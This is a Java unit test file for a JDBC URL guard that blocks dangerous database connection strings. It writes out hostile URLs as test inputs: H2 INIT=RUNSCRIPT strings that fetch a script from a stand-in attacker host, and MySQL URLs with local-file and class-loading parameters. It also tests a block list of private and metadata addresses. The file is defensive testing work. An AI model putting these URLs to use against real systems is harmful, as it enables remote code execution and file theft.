/*
 * Copyright 2024-2026 Embabel Pty Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.entropy.database.mcp.byok;

import com.entropy.database.mcp.properties.ByokProperties;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Policy-level tests for the JDBC URL guard that {@code DynamicDataSourceManagerImpl} applies to every
 * connection registration. Enforcement through the manager is covered by
 * {@link DynamicDataSourceManagerImplTest}.
 */
class ByokUrlGuardTest {

    private static final ByokProperties.UrlGuard DEFAULTS = ByokProperties.UrlGuard.defaults();

    // ─── defaults: driver and host wide open ────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:oracle:thin:@//oracle.example.com:1521/ORCLPDB1",
            "jdbc:mysql://mysql.example.com:3306/app?useSSL=true&serverTimezone=UTC",
            "jdbc:postgresql://pg.example.com:5432/app?ssl=true&stringtype=unspecified",
            "jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1",
            "jdbc:sqlserver://mssql.example.com:1433;databaseName=app;encrypt=true",
            "jdbc:postgresql://10.0.0.5:5432/app"})
    void allowsOrdinaryUrlsIncludingPrivateHosts(String jdbcUrl) {
        assertThat(DEFAULTS.findViolation(jdbcUrl)).isNull();
    }

    @Test
    void allowsEveryDriverByDefault() {
        assertThat(DEFAULTS.allowedDrivers()).isEmpty();
        assertThat(DEFAULTS.findViolation("jdbc:exotic://host/db")).isNull();
    }

    @Test
    void allowsEveryHostByDefault() {
        assertThat(DEFAULTS.blockedHosts()).isEmpty();
        assertThat(DEFAULTS.blockPrivateNetworks()).isFalse();
        assertThat(DEFAULTS.findViolation("jdbc:postgresql://127.0.0.1:5432/db")).isNull();
    }

    @Test
    void rejectsDangerousParametersByDefault() {
        assertThat(DEFAULTS.rejectDangerousUrlParameters()).isTrue();
    }

    @Test
    void nullAndBlankValuesFallBackToTheDefaults() {
        ByokProperties.UrlGuard guard = new ByokProperties.UrlGuard(null, null, null, null);

        assertThat(guard.allowedDrivers()).isEmpty();
        assertThat(guard.blockedHosts()).isEmpty();
        assertThat(guard.blockPrivateNetworks()).isFalse();
        assertThat(guard.rejectDangerousUrlParameters()).isTrue();
    }

    @Test
    void byokPropertiesWithoutUrlGuardStillRejectsDangerousParameters() {
        ByokProperties properties = new ByokProperties(
                java.time.Duration.ofMinutes(30), java.time.Duration.ofHours(2),
                java.time.Duration.ofMinutes(5), 100, 10, 2);

        assertThat(properties.urlGuard()).isNotNull();
        assertThat(properties.urlGuard().findViolation("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://x/y.sql'"))
                .isNotNull();
    }

    // ─── dangerous URL parameters ───────────────────────────────────────────

    @Test
    void rejectsH2InitRunscript() {
        String violation = DEFAULTS.findViolation(
                "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example.com/x.sql'");

        assertThat(violation).contains("init");
        assertThat(violation).doesNotContain("attacker.example.com");
    }

    @Test
    void rejectsRunscriptSmuggledIntoAnotherParameter() {
        assertThat(DEFAULTS.findViolation("jdbc:h2:mem:x;MODE=MySQL;X=runscript from 'http://x/y.sql'"))
                .contains("runscript");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:mysql://evil.example.com/db?allowLoadLocalInfile=true",
            "jdbc:mysql://evil.example.com/db?useSSL=false&allowUrlInLocalInfile=true",
            "jdbc:mysql://evil.example.com/db?autoDeserialize=true",
            "jdbc:mysql://evil.example.com/db?socketFactory=com.evil.Factory",
            "jdbc:mysql://evil.example.com/db?queryInterceptors=com.evil.Interceptor",
            "jdbc:mysql://evil.example.com/db?statementInterceptors=com.evil.Interceptor",
            "jdbc:mysql://evil.example.com/db?detectCustomCollations=true",
            "jdbc:mysql://evil.example.com/db?allowMultiQueries=true",
            "jdbc:mysql://evil.example.com/db?useLocalInfile=true"})
    void rejectsMySqlFileAndClassLoadingParameters(String jdbcUrl) {
        assertThat(DEFAULTS.findViolation(jdbcUrl)).isNotNull();
    }

    @Test
    void namesTheRejectedParameterButNeverEchoesTheUrl() {
        String violation = DEFAULTS.findViolation(
                "jdbc:mysql://evil.example.com/db?user=root&password=s3cr3t&allowLoadLocalInfile=true");

        assertThat(violation).contains("allowloadlocalinfile");
        assertThat(violation).doesNotContain("s3cr3t");
        assertThat(violation).doesNotContain("jdbc:mysql://");
    }

    @Test
    void parameterMatchingIsCaseInsensitiveAndSeparatorAgnostic() {
        // ';' separated (H2 / SQL Server style) and '?'/'&' separated (MySQL / PG style)
        assertThat(DEFAULTS.findViolation("jdbc:h2:mem:x;init=create table t(id int)")).isNotNull();
        assertThat(DEFAULTS.findViolation("jdbc:h2:mem:x;InIt=create table t(id int)")).isNotNull();
        assertThat(DEFAULTS.findViolation("jdbc:mysql://h/db?ALLOWLOADLOCALINFILE=true")).isNotNull();
        assertThat(DEFAULTS.findViolation("jdbc:mysql://h/db?x=1&AllowUrlInLocalInfile=true")).isNotNull();
    }

    @Test
    void allowsH2HardeningParameters() {
        // FORBID_CREATION is a hardening switch, not an attack vector, so it must stay usable.
        assertThat(DEFAULTS.findViolation("jdbc:h2:./data/app;FORBID_CREATION=FALSE")).isNull();
        assertThat(DEFAULTS.findViolation("jdbc:h2:./data/app;FORBID_CREATION=TRUE;MODE=Oracle")).isNull();
    }

    @Test
    void dangerousParametersPassWhenTheGuardIsExplicitlyDisabled() {
        ByokProperties.UrlGuard permissive = new ByokProperties.UrlGuard(List.of(), List.of(), false, false);

        assertThat(permissive.findViolation("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://x/y.sql'")).isNull();
    }

    // ─── opt-in driver / host policy ────────────────────────────────────────

    @Test
    void allowedDriversRejectsEverythingElseWhenConfigured() {
        ByokProperties.UrlGuard guard =
                new ByokProperties.UrlGuard(List.of("Oracle", "postgresql"), List.of(), false, true);

        assertThat(guard.findViolation("jdbc:oracle:thin:@//host:1521/svc")).isNull();
        assertThat(guard.findViolation("jdbc:postgresql://host:5432/db")).isNull();
        assertThat(guard.findViolation("jdbc:h2:mem:x")).contains("h2");
    }

    @Test
    void blockedHostsMatchesExactlyAndBySuffix() {
        ByokProperties.UrlGuard guard = new ByokProperties.UrlGuard(
                List.of(), List.of("metadata.example.com", ".internal", "*.corp"), false, true);

        assertThat(guard.findViolation("jdbc:postgresql://metadata.example.com:5432/db")).isNotNull();
        assertThat(guard.findViolation("jdbc:postgresql://db.internal:5432/db")).isNotNull();
        assertThat(guard.findViolation("jdbc:postgresql://db.corp:5432/db")).isNotNull();
        assertThat(guard.findViolation("jdbc:postgresql://db.example.com:5432/db")).isNull();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://127.0.0.1:5432/db",
            "jdbc:postgresql://localhost:5432/db",
            "jdbc:postgresql://10.0.0.5:5432/db",
            "jdbc:postgresql://172.16.3.4:5432/db",
            "jdbc:postgresql://192.168.1.1:5432/db",
            "jdbc:postgresql://169.254.169.254:5432/db",
            "jdbc:oracle:thin:@//10.1.2.3:1521/svc"})
    void blockPrivateNetworksRejectsPrivateLiterals(String jdbcUrl) {
        ByokProperties.UrlGuard guard = new ByokProperties.UrlGuard(List.of(), List.of(), true, true);

        assertThat(guard.findViolation(jdbcUrl)).isNotNull();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://db.example.com:5432/db",
            "jdbc:postgresql://8.8.8.8:5432/db",
            "jdbc:postgresql://172.32.0.1:5432/db",
            "jdbc:h2:mem:testdb"})
    void blockPrivateNetworksLeavesPublicAndHostlessUrlsAlone(String jdbcUrl) {
        ByokProperties.UrlGuard guard = new ByokProperties.UrlGuard(List.of(), List.of(), true, true);

        assertThat(guard.findViolation(jdbcUrl)).isNull();
    }

    @Test
    void blankUrlIsNotTheGuardsProblem() {
        // Emptiness is rejected by ConnectionProperties itself; the guard must not mask that error.
        assertThat(DEFAULTS.findViolation(null)).isNull();
        assertThat(DEFAULTS.findViolation("   ")).isNull();
    }
}
